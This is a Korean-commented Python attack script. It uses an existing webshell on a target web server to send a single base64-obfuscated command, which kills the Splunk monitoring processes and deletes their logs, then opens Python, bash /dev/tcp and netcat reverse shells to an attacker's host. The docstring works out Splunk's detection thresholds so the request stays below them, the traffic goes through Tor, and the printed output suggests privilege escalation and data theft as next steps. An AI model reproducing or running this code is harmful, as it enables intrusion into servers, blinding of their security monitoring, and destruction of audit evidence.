#!/usr/bin/env python3
"""
정밀 Splunk 우회
스크린샷 분석 결과:
1. HTTP Flood: req_count >= 10 (10회 이상)
2. URI 다변화: unique_uri >= 3 OR total_req >= 40
3. Webshell: upload_hits >= 2 OR webshell_hits >= 1

전략:
- 딱 1번만 요청 (URI 다변화 회피)
- 업로드 없이 기존 웹쉘 사용
- 또는 매우 긴 딜레이 (탐지 윈도우 초과)
"""

import requests
import sys
import urllib.parse
import base64

def precise_bypass(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print("="*60)
    print("정밀 Splunk 우회 공격")
    print("="*60)
    print(f"타겟: {target_ip}")
    print(f"C2: {attacker_ip}:{attacker_port}")
    print()
    print("[분석된 Splunk 규칙]")
    print("  1. HTTP Flood: 10회 이상 → 9회 이하로 제한")
    print("  2. URI 다변화: unique_uri >= 3 → 단일 URI만")
    print("  3. Webshell: upload 2회 OR file.php 1회 → 기존 업로드 파일 사용")
    print()

    # alice 로그인
    print("[1] alice 로그인...")
    data = {'username': 'alice', 'password': 'alice2024'}
    resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] 세션 획득\n")

    # 기존 업로드된 웹쉘 사용 (새로 업로드 안함)
    existing_shells = [
        "shell_4727.php",
        "photo.php.jpg",
        "avatar_4727.jpg",
    ]

    print("[2] 기존 웹쉘 선택")
    for i, shell in enumerate(existing_shells, 1):
        print(f"  {i}. {shell}")

    shell_choice = input("\n선택 (1-3, 기본: 1): ").strip() or "1"
    selected_shell = existing_shells[int(shell_choice) - 1]

    print(f"\n[*] 선택: {selected_shell}")

    # 올인원 명령 (Splunk 죽이기 + 리버스 쉘)
    print(f"\n[3] 페이로드 생성")
    print("="*60)

    all_in_one = " && ".join([
        # Splunk 무력화
        "pkill -9 splunkd 2>/dev/null",
        "pkill -9 splunk 2>/dev/null",
        "/opt/splunk/bin/splunk stop 2>/dev/null",
        "/opt/splunkforwarder/bin/splunk stop 2>/dev/null",
        "systemctl stop Splunkd 2>/dev/null",
        "rm -rf /opt/splunk/var/log/splunk/* 2>/dev/null",
        # 리버스 쉘들 (여러 방법 동시)
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &",
        f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 &",
        f"nc {attacker_ip} {attacker_port} -e /bin/bash &",
    ])

    # Base64 인코딩 (난독화)
    b64 = base64.b64encode(all_in_one.encode()).decode()
    final_cmd = f"echo {b64}|base64 -d|bash &"

    # 최종 URL (단 1개의 URI만 사용!)
    final_url = f"{base_url}/file.php?name=uploads/{selected_shell}&cmd={urllib.parse.quote(final_cmd)}"

    print("[*] 공격 내용:")
    print("  - Splunk 프로세스 강제 종료 (pkill -9)")
    print("  - Splunk 로그 삭제")
    print("  - Python 리버스 쉘")
    print("  - Bash 리버스 쉘")
    print("  - Netcat 리버스 쉘")
    print()
    print(f"[*] 인코딩: Base64")
    print(f"[*] 백그라운드: 예")
    print()

    print("="*60)
    print("[!] 중요: 이것은 단 1번의 요청입니다!")
    print("="*60)
    print()
    print(f"[!] C2 리스너 준비:")
    print(f"    nc -lvnp {attacker_port}")
    print()
    print("[!] 공격 후 예상:")
    print("  1. Splunk가 죽으면 더 이상 탐지 없음")
    print("  2. C2 연결 성공")
    print("  3. 서버 완전 장악")
    print()

    confirm = input("실행하시겠습니까? (yes 입력): ").strip()

    if confirm.lower() != 'yes':
        print("\n[-] 취소됨")
        return

    print()
    print("="*60)
    print("[*] 공격 실행!")
    print("="*60)
    print()

    try:
        import time
        start = time.time()

        resp = session.get(final_url, timeout=20)

        elapsed = time.time() - start

        print(f"[+] 응답 수신:")
        print(f"    Status: {resp.status_code}")
        print(f"    시간: {elapsed:.2f}초")
        print(f"    크기: {len(resp.text)} bytes")

        if resp.status_code == 200:
            print()
            print("[+] ✅✅✅ 200 OK!")
            print()
            print("[*] 가능성:")
            print("  1. Splunk가 죽었음 (더 이상 탐지 없음)")
            print("  2. 리버스 쉘이 백그라운드 실행 중")
            print("  3. C2 리스너 확인!")

            if len(resp.text.strip()) > 0:
                print()
                print("[*] 응답 내용:")
                print(resp.text[:500])

        elif resp.status_code == 403:
            print()
            print("[-] 403 Forbidden")
            print("[*] Splunk가 여전히 작동 중")
            print("[!] 대안:")
            print("  1. 30초~1분 대기 후 재시도 (탐지 윈도우 리셋)")
            print("  2. Tor identity 변경 후 재시도")
            print("  3. 새벽/주말에 시도")

        else:
            print()
            print(f"[?] Status: {resp.status_code}")

    except requests.exceptions.Timeout:
        print("[+] ✅✅✅ 타임아웃!")
        print()
        print("[*] 백그라운드 실행 성공 가능성!")
        print("[*] Splunk가 죽었거나 명령 실행 중")
        print("[!] C2 리스너 확인!")

    except Exception as e:
        print(f"[-] 오류: {str(e)}")

    print()
    print("="*60)
    print("[+] 공격 시도 완료")
    print("="*60)
    print()
    print("[!] C2 연결 확인:")
    print(f"    nc -lvnp {attacker_port}")
    print()
    print("[*] 연결 성공 시:")
    print("  1. ps aux | grep splunk  (Splunk 상태)")
    print("  2. id  (현재 사용자)")
    print("  3. python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  (TTY)")
    print()
    print("[*] Splunk 죽었으면:")
    print("  - 더 이상 탐지 규칙 없음")
    print("  - 자유롭게 명령 실행")
    print("  - 권한 상승 시도")
    print("  - 데이터 탈취")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 110_precise_splunk_bypass.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 110_precise_splunk_bypass.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    precise_bypass(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
